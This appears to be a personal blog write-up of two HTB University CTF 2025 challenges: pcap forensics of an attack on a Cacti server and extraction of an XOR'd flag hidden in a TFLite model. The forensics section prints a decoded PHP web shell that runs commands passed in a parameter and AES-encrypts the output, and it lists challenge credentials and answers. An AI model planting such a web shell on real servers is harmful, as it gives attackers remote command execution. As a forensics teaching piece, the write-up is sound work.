---
title: "HTB University CTF 2025: Tinsel Trouble"
date: 2025-12-22 09:00:00 +0700
categories: [Writeups, Forensics]
tags: [ctf, htb, network, aes, tflite, xor]
description: "Deep dive analysis of Tinsel Trouble: Decrypting AES-256-CBC network streams and reversing TFLite Machine Learning models."
image:
  path: https://s3.eu-central-1.amazonaws.com/htb-ctf-prod-public-storage/ctf/banners/MqUyTLSOoOQppE1kWrgVBhQVTymEs9N0jhlTPc5q.jpg
  alt: HTB University CTF 2025 Banner
---

# 🎄 Grand Legend — The Tinsel Trouble of Tinselwick

In the snow-glittered village of Tinselwick, where peppermint chimneys puff cinnamon steam and toy trains zip between rooftops, the Festival of Everlight is the most magical night of the year. It's when the Great Snowglobe atop Sprucetop Tower shines brightest, sending cheer across the land and granting every child one heartfelt wish.

But this year… something's gone adorably wrong.

The Snowglobe's glow has flickered. The Wish-Wires have tangled. The Nutcracker Choir is singing in reverse. And strangest of all, a mischievous force known only as The Gingerbit Gremlin has stolen the Starshard Bauble, the ornament that powers the whole Festival!

With the countdown to Everlight Eve ticking fast, eight unlikely helpers—toy-fixers, cocoa-brewers, misfit scouts, and jolly engineers—must rally their sleighs, tighten their scarves, and follow peppermint-crumb trails through snowdrift mazes, puzzle cottages, and gingerbread vaults to recover the stolen magic.

This isn't a battle to save the world—it's a dash to save the spirit of the season.

The Great Snowglobe must sparkle again. And in Tinselwick, even the tiniest heart can outshine the longest night.

## Introduction

Hello, In this writeup, I will discuss solutions for 2 challenges that I successfully solved as a contribution to my team in this event. Starting from the **Forensic**, and **Reversing** categories. I will explain them in a very simple way so they are easy to understand.

## Challenges

### **Forensic: A Trail of Snow & Deception**
---

- **Difficulty:** Easy  
- **Points:** 1000

#### Description & Scenario

> Oliver Mirth, Tinselwick's forensic expert, crouched by the glowing lantern post, tracing the shimmerdust trail with a gloved finger. It led into the snowdrifts, then disappeared, no footprints, no sign of a struggle. He glanced up at the flickering Snowglobe atop Sprucetop Tower, its light wavering like a fading star. "Someone’s been tampering with the magic," Oliver murmured. "But why?" He straightened, eyes narrowing. The trail might be gone, but the mystery was just beginning. Can Oliver uncover the secret behind the fading glow?

#### Challenge Questions

1. What is the Cacti version in use? (e.g. 7.1.0)
2. What is the set of credentials used to log in to the instance? (e.g., username:password)
3. Three malicious PHP files are involved in the attack. In order of appearance in the network stream, what are they? (e.g., file1.php,file2.php,file3.php)
4. What file gets downloaded using curl during exploitation process? (e.g. filename)
5. What is the name of the variable in one of the three malicious PHP files that stores the result of the executed system command? (e.g., $q5ghsA)
6. What is the system machine hostname? (e.g. server01)
7. What is the database password used by Cacti? (e.g. Password123)

#### Solution

##### 1. Cacti Version

**Approach:** Search for "Cacti" string in packet details, then follow the HTTP stream.

**Steps:**
1. Filter packets containing "Cacti" → Found **Packet 357**
2. Follow HTTP Stream → Shows the version in response

![Filter Packet](./assets/img/writeups/2025-12-22-university-ctf-2025/forensic-1.png)
![Get Version](./assets/img/writeups/2025-12-22-university-ctf-2025/forensic-2.png)

**Answer 1:** `1.2.28`


##### 2. Login Credentials

**Approach:** Find the login request (POST to index.php) to get username and password.

**Steps:**
1. Use Wireshark filter: `http.request.method == POST && http.request.uri contains "index.php"`
2. Follow TCP Stream → Search the creds in response

![Analysis](./assets/img/writeups/2025-12-22-university-ctf-2025/forensic-3.png)
![Get Username:Password](./assets/img/writeups/2025-12-22-university-ctf-2025/forensic-4.png)

**Answer 2:** `marnie.thistlewhip:Z4ZP_8QzKA`


##### 3. Web Shell & Payload Analysis

**Approach:** Find 3 PHP files uploaded by attacker, in order of appearance.

**Steps:**
1. Filter: `http.request.method == GET and http.request.uri contains ".php"`
2. Mark the order files appear in network stream
3. These are the malicious PHP backdoors
4. The third file has a parameter q that is encrypted in base64 (note)

![3 Files](./assets/img/writeups/2025-12-22-university-ctf-2025/forensic-5.png)

**Answer 3:** `JWuA5a1yj.php,ornf85gfQ.php,f54Avbg4.php`

##### 4. Downloaded File

**Approach:** Find what file was downloaded using curl.

**Filter:** `http.request.method == GET and http.user_agent contains "curl"`

![This files](./assets/img/writeups/2025-12-22-university-ctf-2025/forensic-6.png)

**Answer 4:** `bash`

##### 5. PHP Variable Name

**Approach:** Decode the PHP file and find the variable storing command output.

**Steps:**
1. Decode Base64 PHP code from the web shell
2. Find `shell_exec()` function call
3. Identify variable that stores the output
4. There is evidence of AES encryption usage (note)

![This files](./assets/img/writeups/2025-12-22-university-ctf-2025/forensic-6.png)
![After Open](./assets/img/writeups/2025-12-22-university-ctf-2025/forensic-7.png)
![After Decrypt](./assets/img/writeups/2025-12-22-university-ctf-2025/forensic-8.png)

**Key Code Line:**
```
$A4gVaGzH = "kF92sL0pQw8eTz17aB4xNc9VUm3yHd6G"; // ← Key AES
$A4gVaRmV = "pZ7qR1tLw8Df3XbK"; // ← IV AES
$A4gVaXzY = base64_decode($_GET["q"]);
$a54vag = shell_exec($A4gVaXzY); // ← This stores command output
$A4gVaQdF = openssl_encrypt($a54vag,"AES-256-CBC",$A4gVaGzH,OPENSSL_RAW_DATA,$A4gVaRmV); // ← AES encryption usage
echo base64_encode($A4gVaQdF); 
```

**Answer:** `$a54vag`

##### 6. System Hostname

**Approach:** Find encrypted hostname output, then decrypt using AES-256-CBC.

**Steps:**
1. Search for packet with `hostname` command execution (in the q parameter of the third file mentioned earlier, find the one that when decrypted produces 'hostname')
2. Find encrypted response in packet details
3. Use CyberChef with:
   - **Algorithm:** AES Decrypt
   - **Key:** `kF92sL0pQw8eTz17aB4xNc9VUm3yHd6G`
   - **IV:** `pZ7qR1tLw8Df3XbK`
   - **Input format:** HYjF7a38Od/H2Qc+uaBKuA==
   - **Output format:** tinselmon01

(Key & IV derived from the AES encryption evidence found earlier)

![Image](./assets/img/writeups/2025-12-22-university-ctf-2025/forensic-9.png)
![Image](./assets/img/writeups/2025-12-22-university-ctf-2025/forensic-10.png)
![Image](./assets/img/writeups/2025-12-22-university-ctf-2025/forensic-11.png)
![Image](./assets/img/writeups/2025-12-22-university-ctf-2025/forensic-12.png)

**Answer:** `tinselmon01`

##### 7. Database Password

**Approach:** Find encrypted database config file output, then decrypt it. (The steps are the same as question 6)

**Steps:**
1. Search for packet with `cat include/config.php` command
2. Extract encrypted response
3. Decrypt using same AES-256-CBC key and IV as Question 6
4. Use CyberChef:
   - **Algorithm:** AES Decrypt
   - **Key:** `kF92sL0pQw8eTz17aB4xNc9VUm3yHd6G`
   - **IV:** `pZ7qR1tLw8Df3XbK`
   - **Input format:** (encrypted text)
   - **Output format:** (database configuration)
5. Parse the config file to find `password` field

![Image](./assets/img/writeups/2025-12-22-university-ctf-2025/forensic-13.png)
![Image](./assets/img/writeups/2025-12-22-university-ctf-2025/forensic-14.png)
![Image](./assets/img/writeups/2025-12-22-university-ctf-2025/forensic-15.png)
![Image](./assets/img/writeups/2025-12-22-university-ctf-2025/forensic-16.png)

**Answer:** `zqvyh2fLgyhZp9KV`

---

### **Reversing: CloudyCore**
---

- **Difficulty:** Easy  
- **Points:** 975

#### Description & Scenario

> Twillie, the memory-minder, was rewinding one of her snowglobes when she overheard a villainous whisper. The scoundrel was boasting about hiding the Starshard's true memory inside this tiny memory core (.tflite). He was so overconfident, laughing that no one would ever think to reverse-engineer a 'boring' ML file. He said he 'left a little challenge for anyone who did,' scrambling the final piece with a simple XOR just for fun. Find the key, reverse the laughably simple XOR, and restore the memory.

#### Challenge Question

**What is the hidden memory/flag inside the .tflite file after reversing the XOR?**

#### Solution

##### Open Model with Netron

**Approach:** Analyze .tflite model architecture using Netron.

**Steps:**
1. Open snownet_stronger.tflite file in Netron
2. Model looks odd - only 2 simple paths, not a complex neural network
3. Found 2 suspicious "Const" tensors:
   - Tensor 1x4 (likely key/short string)
   - Tensor 9x1 (likely encrypted payload)

![Image](./assets/img/writeups/2025-12-22-university-ctf-2025/rev-1.png)

##### Extract Raw Bytes from Tensor

**Approach:** Recover actual byte values (Type Confusion issue).

**Steps:**
1. TFLite viewer shows values as tiny floating-point numbers (e.g., 5.877e-39)
2. But actual data is bytes, not float
3. Use `.tobytes()` to extract raw data:

**Results:**
- Tensor 1x4: `k3y!`
- Tensor 9x1: Hex payload starting with `13af8a29...`

```
import tensorflow as tf
import numpy as np

# Challenge file
MODEL_PATH = "snownet_stronger.tflite"

def extract_hidden_data():
    # Load the model
    interpreter = tf.lite.Interpreter(model_path=MODEL_PATH)
    interpreter.allocate_tensors()

    print("[*] Searching for hidden data...")

    # Check the storage boxes (tensors) one by one
    for tensor in interpreter.get_tensor_details():
        # We only look for small boxes to keep the log clean
        # np.prod calculates total elements (e.g., 1x4 = 4)
        if np.prod(tensor['shape']) < 50: 
            try:
                # Get the data (still in weird float format)
                data_float = interpreter.get_tensor(tensor['index'])
                
                # Convert that weird float back to its original form (Bytes/Hex)
                raw_data = data_float.tobytes()
                
                # Show results
                print(f"\n[+] Found Tensor: {tensor['name']}")
                print(f"    Hex (Raw): {raw_data.hex()}")
                
                # Try to read it as normal text
                try:
                    # Filter for readable characters only
                    text = "".join([chr(b) if 32 <= b <= 126 else "." for b in raw_data])
                    print(f"    Readable Text: {text}")
                except:
                    pass

            except ValueError:
                continue

if __name__ == "__main__":
    extract_hidden_data()
```

![Image](./assets/img/writeups/2025-12-22-university-ctf-2025/rev-2.png)

##### XOR Decryption

**Approach:** Decrypt payload using key k3y! with simple XOR.

**Steps:**
1. Take encrypted hex: `13af8a291a990fef5a1b3488e7444f0959bd76134500570b5d7dd0246b5e5b29e3000000`
2. XOR each byte with key `k3y!` (cycling)
3. Result: `789cf308...` (Zlib magic bytes)

##### Zlib Decompress

**Approach:** Decompress XOR result using zlib.

**Steps:**
1. Recognized magic bytes `78 9c` = Zlib signature
2. Use `zlib.decompress()` to inflate
3. Get final flag

**Quick Solver:**
```python
import zlib

encrypted_hex = "13af8a291a990fef5a1b3488e7444f0959bd76134500570b5d7dd0246b5e5b29e3000000"
cipher_data = bytes.fromhex(encrypted_hex)
key = b"k3y!"

# XOR decrypt
decrypted_data = bytes([cipher_data[i] ^ key[i % len(key)] for i in range(len(cipher_data))])

# Decompress
flag = zlib.decompress(decrypted_data)
print(flag.decode())
```

![Image](./assets/img/writeups/2025-12-22-university-ctf-2025/rev-3.png)

**Answer:** `HTB{Cl0udy_C0r3_R3v3rs3d}`

---

Thank you for reading !
Don't forget to follow me on X: @K4lameety